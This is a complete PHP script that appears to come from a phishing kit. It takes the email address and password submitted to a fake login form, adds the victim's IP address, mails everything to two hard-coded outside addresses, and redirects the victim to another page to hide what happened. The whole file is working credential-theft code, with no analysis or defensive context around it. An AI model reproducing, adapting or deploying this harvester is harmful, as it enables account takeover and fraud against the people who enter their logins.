<?php
if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['password']."\n";
$message .= "\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "\n";
$message .= "\n";
$message .= "\n";
$send = "star.boy.81@yandex.com, cashflowbaba@gmail.com";
$subject = " Other//s | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: OT.htm");
}else{
header ("Location: OT.htm");
}

?>